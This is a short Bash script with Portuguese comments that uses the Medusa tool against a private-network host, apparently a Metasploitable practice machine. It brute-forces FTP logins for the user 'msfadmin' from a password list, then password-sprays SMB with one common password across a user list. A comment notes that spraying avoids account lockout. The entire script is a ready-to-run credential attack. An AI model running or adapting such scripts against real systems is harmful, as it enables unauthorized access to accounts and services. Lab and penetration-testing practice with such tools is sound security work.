#!/bin/bash

# Configurações
ALVO="192.168.15.91"  
USERS_FILE="users.txt"
PASS_FILE="pass.txt"

echo "=========================================="
echo " INICIANDO SCRIPT COM MEDUSA"
echo " Alvo: $ALVO"
echo "=========================================="

# 1. Força Bruta em FTP
# Tenta todas as senhas para o usuário específico 'msfadmin'
echo "[+] Iniciando Ataque Brute Force no FTP (Porta 21)..."
medusa -h $ALVO -u msfadmin -P $PASS_FILE -M ftp -v 4
# -u: usuário único | -P: lista de senhas

echo "------------------------------------------"

# 2. Password Spraying em SMB
# Tenta UMA senha comum contra VÁRIOS usuários (evita bloqueio de conta)
SENHA_COMUM="msfadmin"
echo "[+] Iniciando Password Spraying no SMB (Porta 445)..."
echo "    Testando a senha '$SENHA_COMUM' contra lista de usuários..."
medusa -h $ALVO -U $USERS_FILE -p $SENHA_COMUM -M smbnt -v 4
# -U: lista de usuários | -p: senha única

echo "=========================================="
